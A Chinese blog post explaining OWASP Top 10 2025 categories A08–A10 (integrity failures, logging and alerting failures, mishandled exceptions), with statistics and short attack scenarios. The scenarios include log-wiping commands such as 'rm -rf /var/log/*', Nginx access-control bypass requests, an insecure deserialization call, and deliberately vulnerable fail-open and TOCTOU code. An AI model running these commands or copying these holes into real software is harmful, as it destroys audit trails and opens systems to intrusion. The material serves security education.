##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A08-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E6%88%96%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E5%A4%B1%E6%95%88-Software-or-Data-Integrity-Failures)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A08-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E6%88%96%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E5%A4%B1%E6%95%88-Software-or-Data-Integrity-Failures "A08:2025 — 软件或数据完整性失效 \(Software or Data Integrity Failures\)")A08:2025 — 软件或数据完整性失效 (Software or Data Integrity Failures)
[![A08 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Data_Integrity_Failures.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Software_Data_Integrity_Failures.png "A08 icon")A08 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-7)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-7 "背景与数据")背景与数据
保持 #8 不变。官方英文名称从 “Software and Data Integrity Failures” 微调为 **Software or Data Integrity Failures** ，映射了 **14 个 CWE** 。此类别关注的是在运行时和交付时未能验证信任边界。
> **A03 vs A08 的区别** ：A03 关注的是“你依赖的东西本身是否安全”；A08 关注的是“你拿到的东西或数据是否被篡改过”。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 14 个  |  
| 最大发生率  | 8.98%  |  
| 平均发生率  | 2.75%  |  
| 最大覆盖率  | 78.52%  |  
| 平均覆盖率  | 45.49%  |  
| 平均加权 Exploit 评分  | 7.11  |  
| 平均加权 Impact 评分  | 4.79  |  
| 总发生次数  | 501,327  |  
| 关联 CVE  | 3,331  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-7)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-7 "主要包含什么")主要包含什么
  * **不安全的反序列化** （CWE-502）：Java/PHP/Python 原生反序列化、Hessian、Jackson 等
  * **CI/CD 流水线完整性缺失** ：构建产物在部署前没做完整性校验
  * **未签名的更新机制** ：软件自动更新时未验证更新包的签名
  * **第三方 CDN 脚本** ：从前端加载的 JS 库未使用 Subresource Integrity (SRI)


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-7)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-7 "攻击场景")攻击场景
**场景 1：Java 原生反序列化**
这其实就是我最常写的领域。正如 [C3P0 反序列化](https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)、[Hessian 反序列化](https://infernity.top/2025/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)、[CC 链系列](https://infernity.top/categories/JAVA/) 中所分析的，一条完整的反序列化利用链通常包含多个组件协同工作：  
| 
```
1  
2  
3  
4  

```
 | 
```
// 攻击者构造恶意的序列化 payload  
ByteArrayInputStream bais = new ByteArrayInputStream(maliciousBytes);  
ObjectInputStream ois = new ObjectInputStream(bais);  
ois.readObject();  // 触发链子，执行任意代码  

__JAVA
```
 |  
| --- | --- |  
**场景 2：未签名的软件更新**  
| 
```
1  
2  
3  
4  

```
 | 
```
# 更新程序只是简单地从 HTTP 下载并替换文件  
wget http://updates.example.com/app-latest.bin -O /opt/app/bin/app  
# 如果攻击者控制了 updates.example.com 的 DNS 或进行 MITM，  
# 就可以植入后门版本  

__AWK
```
 |  
| --- | --- |  
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A09-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E5%92%8C%E5%91%8A%E8%AD%A6%E5%A4%B1%E6%95%88-Security-Logging-Alerting-Failures)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A09-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E5%92%8C%E5%91%8A%E8%AD%A6%E5%A4%B1%E6%95%88-Security-Logging-Alerting-Failures "A09:2025 — 安全日志和告警失效 \(Security Logging & Alerting Failures\)")A09:2025 — 安全日志和告警失效 (Security Logging & Alerting Failures)
[![A09 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Logging_Alerting_Failures.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Logging_Alerting_Failures.png "A09 icon")A09 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-8)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-8 "背景与数据")背景与数据
排名不变（#9），但名称从 2021 版的 “Security Logging and Monitoring Failures” 更名为 **“Security Logging & Alerting Failures”**，强调了** 告警**的重要性。映射了 **5 个 CWE** ，是 CWE 数量最少的类别之一。
> **核心观点** ：写得再好再全的日志，如果没有对应的告警机制，那也基本等于没写。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 5 个  |  
| 最大发生率  | 11.33%  |  
| 平均发生率  | 3.91%  |  
| 最大覆盖率  | 85.96%  |  
| 平均覆盖率  | 46.48%  |  
| 平均加权 Exploit 评分  | 7.19  |  
| 平均加权 Impact 评分  | 2.65  |  
| 总发生次数  | 260,288  |  
| 关联 CVE  | 723  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-8)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-8 "主要包含什么")主要包含什么
  * 安全相关事件无日志记录（登录失败、权限提升、敏感操作）
  * 日志记录的格式不统一，无法进行关联分析
  * 日志内容不完整，缺少时间戳、来源 IP、用户标识等关键信息
  * 有日志但没有告警规则，攻击发生后数周甚至数月才被发现
  * 日志存储不安全，可被攻击者删除或篡改
  * 日志处理存在注入漏洞（如 Log4Shell 就是日志注入导致的 RCE）


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-8)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-8 "攻击场景")攻击场景
**场景 1：日志被删除**  
| 
```
1  
2  
3  
4  

```
 | 
```
# 攻击者在 SQL 注入获取数据后  
DELETE FROM audit_logs WHERE user_id = 'attacker';  
# 或者直接清空系统日志  
rm -rf /var/log/*  

__PGSQL
```
 |  
| --- | --- |  
如果日志仅存在本地且没有实时转发到集中日志平台，被清理后就永远无法溯源。
**场景 2：有日志无告警**  
| 
```
1  
2  
3  
4  
5  

```
 | 
```
2026-07-08 03:14:22 [WARN] Failed login attempt for user 'admin' from 45.33.32.156  
2026-07-08 03:14:23 [WARN] Failed login attempt for user 'admin' from 45.33.32.156  
2026-07-08 03:14:24 [WARN] Failed login attempt for user 'admin' from 45.33.32.156  
... (10,000 more lines) ...  
2026-07-08 04:02:15 [INFO] User 'admin' logged in successfully from 45.33.32.156  

__ROUTEROS
```
 |  
| --- | --- |  
每分钟 3000 次失败登录后突然成功——如果没告警，管理员可能要等到发现数据泄露才知道。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A10-2025-%E2%80%94-%E5%BC%82%E5%B8%B8%E6%9D%A1%E4%BB%B6%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93-Mishandling-of-Exceptional-Conditions-%F0%9F%86%95)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A10-2025-%E2%80%94-%E5%BC%82%E5%B8%B8%E6%9D%A1%E4%BB%B6%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93-Mishandling-of-Exceptional-Conditions-%F0%9F%86%95 "A10:2025 — 异常条件处理不当 \(Mishandling of Exceptional Conditions\) 🆕")A10:2025 — 异常条件处理不当 (Mishandling of Exceptional Conditions) 🆕
[![A10 icon](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Mishandling_Exceptional_Conditions.png)](https://infernity.top/img/OWASP-TOP-10-2025/TOP_10_Icons_Final_Mishandling_Exceptional_Conditions.png "A10 icon")A10 icon
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-9)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-9 "背景与数据")背景与数据
2025 版全新上榜类别。映射了 **24 个 CWE** 。前几届一直徘徊在 Top 10 边缘，这次终于凭借足够的数据量和社区调查支持成功入榜。  
| 指标  | 数据  |  
| --- | --- |  
| 映射 CWE  | 24 个  |  
| 最大发生率  | 20.67%  |  
| 平均发生率  | 2.95%  |  
| 最大覆盖率  | 100.00%  |  
| 平均覆盖率  | 37.95%  |  
| 平均加权 Exploit 评分  | 7.11  |  
| 平均加权 Impact 评分  | 3.81  |  
| 总发生次数  | 769,581  |  
| 关联 CVE  | 3,416  |  
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-9)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-9 "主要包含什么")主要包含什么
  * **“Fail Open” 设计缺陷** ：系统在异常情况下默认放行，而非拒绝
  * **未捕获的异常** ：代码中未处理异常导致程序崩溃或暴露内部状态
  * **安全检查在异常路径被绕过** ：`try-catch` 中的安全控制逻辑在异常时被跳过
  * **竞态条件（Race Condition）** ：TOCTOU（Time-of-Check Time-of-Use）问题
  * **错误消息泄露敏感信息** ：系统出错时暴露数据库结构、代码路径、堆栈跟踪


###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-9)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-9 "攻击场景")攻击场景
**场景 1：Fail Open 认证绕过**  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  
9  

```
 | 
```
// 危险：异常情况下认证被跳过  
public boolean authenticate(String token) {  
    try {  
        return thirdPartyAuthService.verify(token);  
    } catch (Exception e) {  
        logger.error("Auth service error: " + e.getMessage());  
        return true;  // 错误！Fail Open！认证服务挂了就放行！  
    }  
}  

__JAVA
```
 |  
| --- | --- |  
如果第三方认证服务暂时不可用，系统直接认为所有用户都通过了认证。
**场景 2：TOCTOU 竞态条件**  
| 
```
1  
2  
3  
4  
5  

```
 | 
```
# 先检查再使用，存在时间窗口  
if os.path.exists(filename) and user_has_permission(filename):  
    # <- 攻击者在此刻替换了文件（符号链接攻击）  
    with open(filename, 'r') as f:  
        content = f.read()  

__PYTHON
```
 |  
| --- | --- |  
**场景 3：Nginx 反向代理路径绕过**  
| 
```
1  
2  
3  
4  
5  
6  
7  
8  

```
 | 
```
# Nginx 配置了路径限制  
location /admin/ {  
    deny all;  
}  
  
location / {  
    proxy_pass http://backend;  
}  

__NGINX
```
 |  
| --- | --- |  
| 
```
1  
2  
3  

```
 | 
```
GET /Admin/secret HTTP/1.1    # 大小写绕过  
GET /admin;/secret HTTP/1.1   # 特殊字符绕过    
GET /admin/../secret HTTP/1.1 # 路径穿越绕过  

__HTTP
```
 |  
| --- | --- |  
这让我想起之前做过的很多渗透测试，Nginx/Apache 与后端应用对 URL 解析不一致导致权限绕过，实在太常见了。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2025-%E7%89%88%E6%A0%B8%E5%BF%83%E6%96%B9%E6%B3%95%E8%AE%BA%E5%8F%98%E5%8C%96)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2025-%E7%89%88%E6%A0%B8%E5%BF%83%E6%96%B9%E6%B3%95%E8%AE%BA%E5%8F%98%E5%8C%96 "2025 版核心方法论变化")2025 版核心方法论变化
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%BB%8E%E2%80%9D%E7%97%87%E7%8A%B6%E2%80%9D%E5%88%B0%E2%80%9D%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E2%80%9D)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%BB%8E%E2%80%9D%E7%97%87%E7%8A%B6%E2%80%9D%E5%88%B0%E2%80%9D%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E2%80%9D "从”症状”到”根本原因”")从”症状”到”根本原因”
OWASP Top 10 2025 继续深化了从”症状型分类”向”根本原因型分类”的转变。举个例子：  
| 症状型思维（老版本）  | 根本原因型思维（2025 版）  |  
| --- | --- |  
| “敏感数据暴露”  | 看数据为什么暴露——加密问题归 A04，配置问题归 A02，访问控制问题归 A01  |  
| “XXE”  | 实体解析本质上是一种配置问题，归入 A02 安全配置错误  |  
| “SSRF”  | 本质上是未对服务端请求目标做访问控制，归入 A01 访问控制失效  |  
这种分类方式的优势在于：**对症的诊断更准确，防护建议更有针对性** 。
###  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9D%E7%B1%BB%E5%88%AB%E2%80%9D%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA-CWE-%E5%88%97%E8%A1%A8%EF%BC%9F)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9D%E7%B1%BB%E5%88%AB%E2%80%9D%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA-CWE-%E5%88%97%E8%A1%A8%EF%BC%9F "为什么是”类别”而不是一个 CWE 列表？")为什么是”类别”而不是一个 CWE 列表？
OWASP 收到了很多建议，能不能直接出一个 “Top 10 CWE” 列表？答案是不能：
  1. **不是所有 CWE 都适用于所有语言/框架** 。CWE-89（SQL 注入）在纯前端应用中就不相关。
  2. **同一种漏洞在不同上下文中被映射为不同 CWE** 。比如注入就有 SQL 注入、命令注入、XSS 等不同的 CWE。用类别可以一并覆盖。


2025 版总共包含了 **248 个 CWE** 分布在 10 个类别中。
* * *
##  [](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%80%BB%E7%BB%93)[](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%80%BB%E7%BB%93 "总结")总结
OWASP Top 10 2025 相比 2021 版的核心变化趋势非常明显：
  1. **供应链安全站上 C 位** ：A03 的爆炸半径概念深入人心。一个三方依赖的 0day 可以同时打穿上千个应用。
  2. **配置问题被严重低估了** ：A02 跃升至 #2，100% 的应用都有配置问题，自动化配置审计不再是可选项。
  3. **异常路径成为新的攻击面** ：A10 的上榜说明攻击者越来越擅长寻找正常功能的“边界”和“边缘情况”。
  4. **传统 Web 问题在减少但未消失** ：注入、认证失效等传统问题排名虽然下降，但在缺乏安全框架的遗留系统中仍然遍地都是。
  5. **根本原因分类法更成熟** ：SSRF 归入 A01、XXE 归入 A02，体现了工程思维的进步。


* * *
参考文章：
<https://owasp.org/Top10/2025/0x00_2025-Introduction/>
<https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/>
<https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/>
<https://www.invicti.com/blog/web-security/owasp-top-10>
<https://www.metacompliance.com/blog/cyber-security-awareness/owasp-top-10-2025-released-what-you-need-to-know>
<https://securityboulevard.com/2025/11/owasp-top-10-2025-updates-supply-chain-secrets-and-misconfigurations-take-center-stage/>
<https://sdtimes.com/security/owasp-top-10-updated-after-four-years-with-many-of-the-same-concerns-still-impacting-applications/>
<https://blog.qualys.com/qualys-insights/2026/06/15/what-changed-in-owasp-top-10-2025-and-recommendations-for-each-category>
<https://www.twcert.org.tw/newepaper/cp-65-10556-3db82-3.html>
<https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/>
<https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/>
<https://owasp.org/Top10/2025/A05_2025-Injection/>
<https://owasp.org/Top10/2025/A06_2025-Insecure_Design/>
<https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/>
<https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/>
<https://owasp.org/Top10/2025/A09_2025-Security_Logging_and_Alerting_Failures/>
<https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/>
* * *
[WEB安全](https://infernity.top/categories/WEB%E5%AE%89%E5%85%A8/)
[#WEB安全](https://infernity.top/tags/WEB%E5%AE%89%E5%85%A8/)
OWASP TOP 10 2025 详细解析
http://example.com/2026/07/08/OWASP-TOP-10-2025/
作者
Infernity
发布于
2026年7月8日
许可协议
[ ](https://creativecommons.org/licenses/by/4.0/)
[ 从零开始的高版本JDKJava反序列化学习——Jackson链 下一篇 ](https://infernity.top/2026/05/20/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACJDKJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Jackson%E9%93%BE/ "从零开始的高版本JDKJava反序列化学习——Jackson链")
目录
  1. [前言](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E5%89%8D%E8%A8%80 "前言")
  2. [2021 版 vs 2025 版变化一览](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2021-%E7%89%88-vs-2025-%E7%89%88%E5%8F%98%E5%8C%96%E4%B8%80%E8%A7%88 "2021 版 vs 2025 版变化一览")
  3. [方法论简述](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%96%B9%E6%B3%95%E8%AE%BA%E7%AE%80%E8%BF%B0 "方法论简述")
  4. [A01:2025 — 访问控制失效 (Broken Access Control)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A01-2025-%E2%80%94-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%A4%B1%E6%95%88-Broken-Access-Control "A01:2025 — 访问控制失效 \(Broken Access Control\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF "攻击场景")
  5. [A02:2025 — 安全配置错误 (Security Misconfiguration)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A02-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-Security-Misconfiguration "A02:2025 — 安全配置错误 \(Security Misconfiguration\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-1 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-1 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-1 "攻击场景")
  6. [A03:2025 — 软件供应链失效 (Software Supply Chain Failures)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A03-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E4%BE%9B%E5%BA%94%E9%93%BE%E5%A4%B1%E6%95%88-Software-Supply-Chain-Failures "A03:2025 — 软件供应链失效 \(Software Supply Chain Failures\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-2 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-2 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-2 "攻击场景")
  7. [A04:2025 — 加密机制失效 (Cryptographic Failures)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A04-2025-%E2%80%94-%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6%E5%A4%B1%E6%95%88-Cryptographic-Failures "A04:2025 — 加密机制失效 \(Cryptographic Failures\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-3 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-3 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-3 "攻击场景")
  8. [A05:2025 — 注入 (Injection)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A05-2025-%E2%80%94-%E6%B3%A8%E5%85%A5-Injection "A05:2025 — 注入 \(Injection\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-4 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-4 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-4 "攻击场景")
  9. [A06:2025 — 不安全设计 (Insecure Design)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A06-2025-%E2%80%94-%E4%B8%8D%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1-Insecure-Design "A06:2025 — 不安全设计 \(Insecure Design\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-5 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-5 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-5 "攻击场景")
  10. [A07:2025 — 身份认证失效 (Authentication Failures)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A07-2025-%E2%80%94-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%A4%B1%E6%95%88-Authentication-Failures "A07:2025 — 身份认证失效 \(Authentication Failures\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-6 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-6 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-6 "攻击场景")
  11. [A08:2025 — 软件或数据完整性失效 (Software or Data Integrity Failures)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A08-2025-%E2%80%94-%E8%BD%AF%E4%BB%B6%E6%88%96%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7%E5%A4%B1%E6%95%88-Software-or-Data-Integrity-Failures "A08:2025 — 软件或数据完整性失效 \(Software or Data Integrity Failures\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-7 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-7 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-7 "攻击场景")
  12. [A09:2025 — 安全日志和告警失效 (Security Logging & Alerting Failures)](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A09-2025-%E2%80%94-%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97%E5%92%8C%E5%91%8A%E8%AD%A6%E5%A4%B1%E6%95%88-Security-Logging-Alerting-Failures "A09:2025 — 安全日志和告警失效 \(Security Logging & Alerting Failures\)")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-8 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-8 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-8 "攻击场景")
  13. [A10:2025 — 异常条件处理不当 (Mishandling of Exceptional Conditions) 🆕](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#A10-2025-%E2%80%94-%E5%BC%82%E5%B8%B8%E6%9D%A1%E4%BB%B6%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93-Mishandling-of-Exceptional-Conditions-%F0%9F%86%95 "A10:2025 — 异常条件处理不当 \(Mishandling of Exceptional Conditions\) 🆕")
    1. [背景与数据](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E8%83%8C%E6%99%AF%E4%B8%8E%E6%95%B0%E6%8D%AE-9 "背景与数据")
    2. [主要包含什么](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BB%E8%A6%81%E5%8C%85%E5%90%AB%E4%BB%80%E4%B9%88-9 "主要包含什么")
    3. [攻击场景](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF-9 "攻击场景")
  14. [2025 版核心方法论变化](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#2025-%E7%89%88%E6%A0%B8%E5%BF%83%E6%96%B9%E6%B3%95%E8%AE%BA%E5%8F%98%E5%8C%96 "2025 版核心方法论变化")
    1. [从”症状”到”根本原因”](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%BB%8E%E2%80%9D%E7%97%87%E7%8A%B6%E2%80%9D%E5%88%B0%E2%80%9D%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E2%80%9D "从”症状”到”根本原因”")
    2. [为什么是”类别”而不是一个 CWE 列表？](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E2%80%9D%E7%B1%BB%E5%88%AB%E2%80%9D%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA-CWE-%E5%88%97%E8%A1%A8%EF%BC%9F "为什么是”类别”而不是一个 CWE 列表？")
  15. [总结](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/#%E6%80%BB%E7%BB%93 "总结")


[ ](https://infernity.top/2026/07/08/OWASP-TOP-10-2025/)
#### 搜索
×
关键词
[Hexo](https://hexo.io) [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)
总访问量 次  总访客数 人 
